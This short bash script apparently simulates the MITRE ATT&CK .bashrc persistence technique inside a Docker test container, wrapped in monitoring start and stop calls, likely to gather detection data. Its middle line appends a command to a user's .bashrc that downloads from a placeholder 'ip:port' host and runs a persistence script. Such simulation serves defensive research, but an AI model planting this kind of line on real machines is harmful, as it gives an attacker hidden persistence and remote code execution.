#!/bin/bash
BASEPATH=`dirname $0`/../input_T1156_.bashrc/output_test
mkdir -p $BASEPATH
monitoring_scripts/monitoring.sh $BASEPATH
sleep 5
docker exec -it ubuntu-test-mitre bash -c "echo 'wget ip:port && /tmp/get_persistence.sh' >> /home/developer/.bashrc"
sleep 5
monitoring_scripts/killmonitoring.sh $BASEPATH
